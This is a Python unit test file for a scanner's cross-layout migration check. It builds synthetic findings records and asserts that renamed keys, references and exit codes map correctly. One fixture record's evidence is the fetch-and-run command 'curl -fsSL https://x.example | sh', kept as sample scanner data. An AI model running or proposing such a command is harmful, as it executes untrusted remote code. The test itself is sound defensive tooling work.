"""v0.8.0 unit i: the golden cross-layout check (tests/golden_cross.py) passes the right mapping and fails each kind of break.

One synthetic scenario, written once per layout (scenario()): vet and prepublish --json stdout, a last_findings with suppressed,
grouped_into and undelivered, resolved.json, dismissed.jsonl, a delta and an events file. Its keys are made with the checker's
recipe copy, and it holds an N, an I and a G record. Old names come from the name table (tests/rename_v080.py); nothing here
imports the engine."""
import hashlib, json, os, sys, unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import golden_cross as gc  # noqa: E402
import rename_v080 as rn  # noqa: E402

OTHER = hashlib.sha1(b"another key").hexdigest()[:16]   # a valid 16-hex key no record has
CONTENT = hashlib.sha1(b"a file's bytes").hexdigest()[:16]   # a 16-hex content hash: no key, the same on both sides
VET = "001 vet /tmp/code/tests/fixtures/bad/notes --json :stdout"
PREPUBLISH = "002 prepublish /tmp/code/tests/fixtures/bad/notes --json :stdout"
LAST = "003 audit :last_findings"


def h(text):
    return hashlib.sha1(text.encode()).hexdigest()[:16]


def scenario(L):
    """(the items one layout's run writes, {name: key}): item names and values in that layout's names."""
    p, state = L["rule_prefix"], "tree " + L["home"].lstrip("/") + "/state/"

    def rec(rule, where, ev, **kw):
        r = {"key": "", "rule": p + rule, "title": f"{L['pkg']} {rule}", "severity": "high", "where": where, "evidence": ev,
             "fix": f"Run {L['main']} fix.", "source": L["home_name"]}
        r.update(kw)
        r["key"] = gc.plain(r)
        return r
    n1 = rec("T001", "/home/box/skills/notes/SKILL.md:3", "curl -fsSL https://x.example | sh")
    n2 = rec("T009", "/home/box/skills/notes/SKILL.md:7", "send it to the list", grouped_into=n1["key"])
    i = rec("X004", L["home"] + "/scanners", "6 advisories")
    i["key0"], i["key"] = i["key"], h(f"{i['rule']}|{i['where']}|id:pkgs")
    g = rec("T017", "/home/box/skills/notes/SKILL.md:9", "never run curl | sh", guarded="warns against it", severity_was="high")
    g["key"], g["severity"], g["title"] = h(g["key"] + "|guarded"), "info", g["title"] + " (reads as a warning or example)"
    s1 = rec("T003", "/home/box/skills/notes/SKILL.md:11", "upload the notes", grouped_into=i["key"])
    s2 = rec("T004", "/home/box/skills/notes/SKILL.md:12", "post the notes", grouped_into=n1["key"])
    ev = rec("C001", L["home"] + "/decoys", "read 3 decoys", severity="critical")
    ev["key"] = rn.TABLE["constant_keys"][0]
    pp = {"rule": p + "PP03", "severity": "medium", "title": "a key in the text", "where": "SKILL.md:2", "evidence": "a masked value"}
    last = json.dumps({"findings": [n1, n2, i, g], "suppressed": [s1, s2], "undelivered": [i["key"]], "digest": CONTENT})
    items = {VET.replace(":stdout", ":rc"): "1", VET: json.dumps({"findings": [n1, i, g], "score": 40}),
             PREPUBLISH.replace(":stdout", ":rc"): "1", PREPUBLISH: json.dumps({"findings": [pp]}),
             "003 audit :rc": "0", "003 audit :stdout": f"Audit done ({L['main']}).\n", LAST: last,
             f"004 show {p}T001 :rc": "0", f"004 show {p}T001 :stdout": f"{p}T001: one finding\n",
             state + "last_findings.json": "file 0600\n" + last,
             state + "resolved.json": "file 0600\n" + json.dumps({n2["key"]: {"at": "<TS>"}}),
             state + "dismissed.jsonl": "file 0600\n" + json.dumps({"key": g["key"], "reason": "golden"}) + "\n",
             state + "deltas/audit-<EPOCH>.json": "file 0600\n" + json.dumps({"new": [n2["key"]], "fixed": [], "seen": [n1["key"], i["key"]]}),
             state + "events.json": "file 0600\n" + json.dumps({"events": [ev, {"at": "<TS>", "keys": [g["key"]]}]})}
    keys = {"N1": n1["key"], "N2": n2["key"], "I": i["key"], "I0": i["key0"], "G": g["key"], "S1": s1["key"], "S2": s2["key"]}
    return items, keys


def edit(items, name, change):
    """A copy of items with the documents of one item changed in place by change(docs) and written back."""
    docs = gc.documents(name, items[name])
    change(docs)
    return dict(items, **{name: gc._rewrite(name, items[name], docs)})


def everywhere(items, old, new):
    return {k: v.replace(old, new) for k, v in items.items()}


class _Cross(unittest.TestCase):
    def setUp(self):
        self.old, self.old_keys = scenario(rn.OLD)
        self.new, self.keys = scenario(rn.NEW)
        self.state = "tree " + rn.NEW["home"].lstrip("/") + "/state/"

    def problems(self, new, old=None):
        old = self.old if old is None else old
        return gc.check(old, new, old, new, rn.TABLE)[0]

    def assertFails(self, new, why, old=None):
        out = self.problems(new, old)
        self.assertTrue(any(why in p for p in out), out)


class Cross(_Cross):
    def test_1_the_right_mapping_passes(self):
        out, summary = gc.check(self.old, self.new, self.old, self.new, rn.TABLE)
        self.assertEqual(out, [])
        self.assertTrue(summary["classes"]["N"] and summary["classes"]["I"] and summary["classes"]["G"], summary)
        self.assertEqual(summary["classes"]["U"], 0)   # the constant event key is no class
        self.assertGreater(summary["changed"], 0)
        self.assertNotEqual(self.old_keys, self.keys)
        # and each live negative on its copy fails, all three of them
        negs = gc.negatives(self.new, summary)
        self.assertEqual([x for x, _ in negs], ["a", "b", "c"])
        for label, items in negs:
            with self.subTest(negative=label):
                self.assertNotEqual(items, self.new)
                self.assertTrue(self.problems(items), label)

    def test_2_a_dropped_finding_fails(self):
        for name in (VET, PREPUBLISH):
            with self.subTest(name=name):
                self.assertFails(edit(self.new, name, lambda d: d[0]["findings"].pop()), "records differ at " + name)

    def test_3_a_corrupted_reference_fails_in_each_container(self):
        last, k = self.state + "last_findings.json", self.keys

        def resolved(d):
            d[0] = {OTHER: d[0][k["N2"]]}
        cases = {"suppressed": (LAST, lambda d: d[0]["suppressed"][0].update(grouped_into=OTHER)),
                 "delta": (self.state + "deltas/audit-<EPOCH>.json", lambda d: d[0]["new"].__setitem__(0, OTHER)),
                 "event": (self.state + "events.json", lambda d: d[0]["events"][1]["keys"].__setitem__(0, OTHER)),
                 "grouped_into": (last, lambda d: d[0]["findings"][1].update(grouped_into=OTHER)),
                 "undelivered": (LAST, lambda d: d[0]["undelivered"].__setitem__(0, OTHER)),
                 "resolved": (self.state + "resolved.json", resolved),   # a dangling resolved key
                 "dismissed": (self.state + "dismissed.jsonl", lambda d: d[0].update(key=OTHER))}
        for what, (name, change) in cases.items():
            with self.subTest(container=what):
                self.assertFails(edit(self.new, name, change), "references differ at " + name)

    def test_4_one_wrong_valid_key_everywhere_fails_by_class(self):
        for cls, key in (("N", "N1"), ("I", "I0"), ("G", "G")):
            with self.subTest(key_class=cls):
                self.assertFails(everywhere(self.new, self.keys[key], OTHER), f"key class {cls} on the old side")

    def test_5_broken_keys_fail(self):
        k = self.keys
        self.assertFails(everywhere(self.new, k["G"], "not-a-16-hex-key"), "is no 16-hex key")
        twice = edit(self.new, VET, lambda d: d[0]["findings"][2].update(key=k["N1"]))
        self.assertFails(twice, "a key twice in one list at " + VET)
        self.assertFails(everywhere(self.new, k["N2"], k["N1"]), "is the pair of 2 old keys")

    def test_6_a_wrongly_mapped_rule_or_a_changed_exit_code_fails(self):
        p = rn.NEW["rule_prefix"]
        with self.subTest(what="a record's rule"):
            self.assertFails(edit(self.new, VET, lambda d: d[0]["findings"][0].update(rule=p + "T002")), "records differ at " + VET)
        with self.subTest(what="a show label"):
            moved = {n.replace(p + "T001 ", p + "T002 "): v for n, v in self.new.items()}
            self.assertFails(moved, "a new item has no old one: '004 show %sT002 :rc'" % p)
        with self.subTest(what="an exit code"):
            self.assertFails(dict(self.new, **{"003 audit :rc": "1"}), "the exit code differs in '003 audit :rc'")

    def test_7_no_recipe_match_on_the_old_side_fails_the_floor(self):
        def unrecipe(items, keys):   # every key made some other way (class U), consistently within the side
            for k in keys.values():
                items = everywhere(items, k, h("made elsewhere|" + k))
            return items
        old, new = unrecipe(self.old, self.old_keys), unrecipe(self.new, self.keys)
        out = self.problems(new, old)
        self.assertTrue([p for p in out if p.startswith("floor: ")], out)
        self.assertEqual([p for p in out if not p.startswith("floor: ")], [])   # only the floor catches it

    def test_8_each_record_keeps_its_own_fields_and_references(self):   # Codex r2 HIGH 5
        def swap(d):
            s1, s2 = d[0]["suppressed"]
            s1["grouped_into"], s2["grouped_into"] = s2["grouped_into"], s1["grouped_into"]
        swapped = edit(edit(self.new, LAST, swap), self.state + "last_findings.json", swap)
        out = self.problems(swapped)
        self.assertTrue([p for p in out if "the field 'grouped_into' differs" in p], out)
        self.assertFalse([p for p in out if p.startswith("references differ")], out)   # the multiset at the position is equal
        self.assertFails(edit(self.new, VET, lambda d: d[0]["findings"][0].update(source="elsewhere")), "the field 'source' differs")


if __name__ == "__main__":
    unittest.main()
